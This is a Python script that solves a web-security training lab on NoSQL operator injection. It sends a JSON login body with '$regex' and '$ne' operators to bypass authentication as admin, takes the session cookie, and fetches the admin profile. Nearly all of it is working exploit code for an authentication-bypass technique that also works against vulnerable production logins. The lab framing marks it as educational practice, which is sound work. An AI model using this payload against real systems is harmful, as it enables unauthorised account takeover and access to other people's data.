#########################################################################################
#
# Author: Ahmed Elqalaawy (@elqal3awii)
#
# Date: 30/9/2023
#
# Lab: Exploiting NoSQL operator injection to bypass authentication
#
# Steps: 1. Injecting operators in the request body to bypass authentication
#           and login as admin
#        2. get session cookie from the response headers
#        3. Fetch the admin profile
#
#########################################################################################


###########
# imports
###########
import requests
from colorama import Fore
import re


#########
# Main
#########

# change this to your lab URL
url = "https://0aea00cf0375ba5884cb45cd00ca00e5.web-security-academy.net"

# payload to bypass authentication and login in as admin
payload = """
{
    "username": {
        "$regex": "admin.*"
    },
    "password": {
        "$ne":""
    }
}
"""

# set content-type header
headers = {
    "Content-Type": "application/json"
}

try:  
    # login as admin
    login = requests.post(f"{url}/login", payload, headers=headers, allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to login as admin through exception")
    exit(1)

print(Fore.WHITE + "â¦—1â¦˜ Injecting operators in the request body to bypass authentication.. " + Fore.GREEN + "OK")

# get session cookie
session = login.cookies.get("session")

# extract admin username from the Location header
admin_username = re.findall("id=(.*)", login.headers.get("Location"))[0]

print(Fore.WHITE + "â¦—2â¦˜ Extracting session cookie of the admin.. " + Fore.GREEN + "OK")

# set session cookie
cookies = {
    "session": session
}

try:
    # fetch admin profile
    admin = requests.get(f"{url}/my-account", cookies=cookies)
    
except:
    print(Fore.RED + "[!] Failed to fetch the admin profile through exception")
    exit(1)

print(Fore.WHITE + "â¦—3â¦˜ Fetching " + Fore.YELLOW + admin_username + Fore.WHITE + " profile.. " + Fore.GREEN + "OK")
print(Fore.WHITE + "ðŸ—¹ The lab should be marked now as " + Fore.GREEN + "solved")

